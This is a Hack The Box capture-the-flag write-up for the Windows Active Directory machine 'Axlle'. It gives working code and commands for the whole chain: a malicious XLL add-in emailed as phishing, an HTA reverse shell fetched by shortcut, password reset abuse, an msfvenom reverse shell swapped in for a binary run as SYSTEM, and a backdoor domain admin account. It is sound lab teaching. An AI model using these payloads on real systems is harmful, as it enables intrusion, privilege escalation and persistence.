---
title: HTB-Axlle
draft: false
tags:
  - htb
  - windows
  - active-directory
  - hard
  - xll
  - xll-exec
  - hta
  - bloodhound
  - forcechangepassword
  - icacls
---
![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/Axlle.png)

## Information Gathering
### Rustscan

Rustscan finds bunch of open ports. Based on the ports open, this machine seems to be an Active Directory machine.

`rustscan --addresses 10.10.11.21 --range 1-65535`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image.png)

One interesting point is that port 25 is open, running SMTP. 

## Enumeration
### HTTP - TCP 80

Website reveals the domain name **axlle.htb** which we add to `/etc/hosts`.

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-1.png)

> If you have any outstanding invoices or requests, please email them to accounts@axlle.htb in Excel format. Please note that all macros are disabled due to our security posture.

Based on the website, it seems like the initial foothold could be related to email related phishing. 

## Shell as gideon.hamill
### XLL Exec

Through many attempts, we discovered this mail server is vulnerable to [XLL Exec](https://swisskyrepo.github.io/InternalAllTheThings/redteam/access/office-attacks/#xll-exec).


> An XLL (Excel Add-In) execution attack is a type of cyber attack that leverages XLL files to execute malicious code within Microsoft Excel. XLL files are dynamic link libraries (DLLs) specifically designed for use with Excel, allowing developers to extend Excel's functionality with custom functions and features.

First, we will create exploit.c file containing the following content:

```c
#include <windows.h>

__declspec(dllexport) void __cdecl xlAutoOpen(void);

void __cdecl xlAutoOpen() {
    WinExec("powershell -e <snipped>pAA==", 1);
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

We will copy-paste in the powershell reverse shell code from revshells.com to the above exploit.c.

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-3.png)

Now that exploit.c is ready, we will compile it:

`x86_64-w64-mingw32-gcc -fPIC -shared -o shell.xll exploit.c -luser32`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-4.png)

Let's send the compiled shell.xll to `accounts@axlle.htb` using swaks:

`swaks --to accounts@axlle.htb --from root@test.htb --body "Shell" --header "Subject: Help me Breach the System" --attach @shell.xll`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-5.png)

Waiting for a few seconds, user inside the system reads the maliciously crafted payload and executes the reverse shell command:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-2.png)

## Privesc: gideon to dallon

Exploring around the file system, we discovered .eml file inside hmailserver:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-6.png)

email is saying that shortcuts inside `C:\inetpub\testing` will be tested using automation:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-7.png)

### HTA


Let's create maliciously crafted .hta file inside `C:\inetpub\testing` and wait for the automation to run it.

> An HTA (HTML Application) attack is a type of cyber attack that exploits the capabilities of HTA files to execute malicious code on a victim's system. HTA files are HTML files that are executed by the Microsoft HTML Application Host (`mshta.exe`). They have the file extension `.hta` and can contain a mix of HTML, VBScript, JavaScript, and other web technologies. When opened, HTA files run as standalone applications with the same privileges as the user.


We will create shell.hta file with the following [content](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/windows#hta-example):

```html 
<html>
<head>
<HTA:APPLICATION ID="shell">
<script language="javascript">
        var c = "powershell -e <snipped>pAA==";  
        new ActiveXObject('WScript.Shell').Run(c, 0, true); 
</script>
</head>
<body>
<script>self.close();</script>
</body>
</html>
```

Now on the target system, we will execute following commands so that it will download shell.hta and create shortcut leading to it:

```powershell
$url = "file://10.10.14.36/share/shell.hta"
$shortcutPath = "C:\inetpub\testing\shell.url"
$shortcutContent = "[InternetShortcut]`r`nURL=$url"
Set-Content -Path $shortcutPath -Value $shortcutContent
```

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-9.png)

After waiting for few seconds, target system downloads shell.hta from our kali machine:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-8.png)

Upon downloading, reverse shell is spawned in few seconds:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-10.png)


## Privesc: dallon to jacob
### Bloodhound

Since this is an Active Directory machine, we will upload and run bloodhound.exe:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-11.png)

Let's download the created zip file.

We will first start impacket-smbserver:

`impacket-smbserver share $(pwd) -smb2support`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-12.png)

Use `net use` command to transfer the zip file to local kali machine:

```
net use * \\10.10.14.23\share
copy 20240626183912_BloodHound.zip Z:
```

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-13.png)

After opening the zip file through bloodhound, we can see that user dallon has **forcechangepassword** right for user jacob and baz. 

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-14.png)

### ForceChangePassword

> The members of the group WEB DEVS@AXLLE.HTB have the capability to change the user JACOB.GREENY@AXLLE.HTB's password without knowing that user's current password.

Let's first transfer powerview.ps1:

`copy \\10.10.14.23\share\PowerView.ps1`

Now we will change the password for user jacob to anything we want:

```
$pass = ConvertTo-SecureString 'SuperSecuredPassword123!' -AsPlainText -Force
Set-DomainUserPassword -Identity Jacob.Greeny -AccountPassword $pass
```

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-15.png)

We can winrm in as jacob using the changed password:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-16.png)

## Privesc: jacob to administrator

Inside App Development folder, there is a README.md file:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-17.png)

README.md file is saying standalonerunner.exe file is being ran as a SYSTEM with automation:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-18.png)

Inside `C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64`, we can find standalonerunner.exe:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-19.png)

Let's check the permission:

`icacls standalonerunner.exe`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-20.png)

- **Full Control**: `AXLLE\Administrator`, `NT AUTHORITY\SYSTEM`, `BUILTIN\Administrators`.
- **Read & Execute, Write**: `AXLLE\App Devs`.
- **Read & Execute**: `BUILTIN\Users`, `APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES`, `APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES`.
- **Read Only**: `Everyone`.

Since jacob is in App Devs group, we should be able to write on this file.

Let's replace standalonerunner.exe with our maliciously crafted payload.

We will first create reverse shell exe file using msfvenom:

`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.23 LPORT=9001 -f exe -o rev.exe`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-25.png)

Copy the reverse shell payload to the system and replace standalonerunner.exe:

`wget http://10.10.14.23:1234/rev.exe -o standalonerunner.exe`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-22.png)


Waiting for few seconds, automation runs the reverse shell payload as the system and we get a shell as the administrator:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-24.png)

## Persistence

We will add a user hacker for persistence and give it domain admins access:

```
net user hacker P@ssw0rd! /add
net group "Domain Admins" /add hacker
```

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-26.png)

We can now winrm in as hacker:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-27.png)

## References
- https://swisskyrepo.github.io/InternalAllTheThings/redteam/access/office-attacks/#xll-exec
- https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/windows#hta-example
